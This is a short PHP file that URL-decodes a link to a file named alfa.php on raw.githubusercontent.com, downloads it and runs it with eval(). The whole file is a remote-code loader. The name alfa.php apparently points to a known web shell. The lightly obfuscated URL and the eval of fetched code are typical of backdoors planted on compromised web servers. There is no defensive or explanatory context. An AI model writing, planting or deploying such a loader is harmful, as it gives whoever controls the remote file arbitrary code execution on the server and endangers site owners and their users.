<?php

$content = file_get_contents(urldecode('https%3A%2F%2Fraw.githubusercontent.com%2FCZDalkan%2Fasset%2Fmain%2Falfa.php'));

$content = "?> ".$content;
eval($content);
